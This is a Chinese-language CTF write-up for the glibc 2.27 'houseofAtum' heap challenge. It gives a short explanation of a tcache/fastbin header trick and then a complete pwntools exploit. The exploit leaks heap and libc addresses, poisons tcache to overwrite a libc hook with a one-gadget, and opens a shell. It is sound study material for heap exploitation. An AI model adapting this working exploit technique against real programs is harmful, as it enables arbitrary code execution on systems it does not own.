这题是three的升级版，有了leak函数，但是限制条件变成只能申请两个堆

重点是在两个堆的情况下能leak出libc并且能进行多次任意地址写入

按照之前的思路。要控制堆到任意地址，至少需要3个堆,这也是tcache先进后出的特点，申请大小固定，如果你edit改了fd后就需要两个chunk到所需位置，之前edit的chunk没法改，改了排在前面没法。所以相当于多了一个chunk

这里我复现的r3kapig的wp



**fastbin和tcache的chunk header位置**

fastbin header指向的size位置，而tcache指向的是mem_chunk

利用这个特性就可以不用tcache_dup的方式fake_chunk,



**利用tcache_header**

这一点和我上题思路很像



**覆盖tcache_size位**

这里技能0x48大小不是白来的，既能修改到0x50tcache的header指针，又能覆盖到0x250大小的size位



```python
from pwn import *

ip = ""
port = 2333
fileName = "houseofAtum"
libcName = "libc.so.6"
libcver = 2.27

if args["LIBC"]:
    from change import *
    context.terminal = ["terminator", "-e"]
    context.log_level = "debug"
    bin = change_ld(fileName,libcver)
    p = bin.process()
elif args["REMOTE"]:
    p = remote(ip,port)
else:
    from change_ld import *
    context.terminal = ["terminator","-e"]
    bin = change_ld(fileName,libcName)
    libc = ELF(libcName)
    p = bin.process(env={"LD_PRELOAD":libc.path})

def Debug(cmd=""):
    gdb.attach(p)
    pause()


def new(content):
    p.sendlineafter("choice:", "1")
    p.sendafter("content:", content)


def edit(idx, content):
    p.sendlineafter("choice:", "2")
    p.sendlineafter("idx:", str(idx))
    p.sendafter("content:", content)


def delete(idx, choice):
    p.sendlineafter("choice:", "3")
    p.sendlineafter("idx:", str(idx))
    p.sendlineafter("(y/n):", choice)

def show(idx):
    p.sendlineafter("choice:", "4")
    p.sendlineafter("idx:", str(idx))
    p.recvuntil("Content:")

new("A"*8)
new("B"*8)
delete('0','n')
delete('1','n')
show(1)
heap_base = u64(p.recv(6)+"\x00"*2)-0x260
success("heap_base-->"+hex(heap_base))
for i in range(5):
    delete(0,"n")
delete('1','y')
delete('0','y')
new("A"*0x30+p64(0)+p64(0x81)+p64(heap_base+0x30))
new("B")
delete(1,"y")
new("A")
delete(0,"y")
edit(1,p64(0)*7+p64(heap_base+0x10))
new("0x11")#0
for i in range(7):
    delete(0,"n")
delete(0,"y")
edit(1,p64(0)*7+p64(heap_base+0x10))
new('\xa0')#0
show(0)
libc_addr = u64(p.recv(6)+"\x00"*2)+0xe4d360
success("libc_addr-->"+hex(libc_addr))
delete(0,"y")
edit(1,p64(0)*7+p64(libc_addr+0x1b48e8))
new(p64(libc_addr+0x43cfe))
p.sendlineafter("choice:", "3")
p.sendlineafter("idx:", "0")
p.interactive()
```

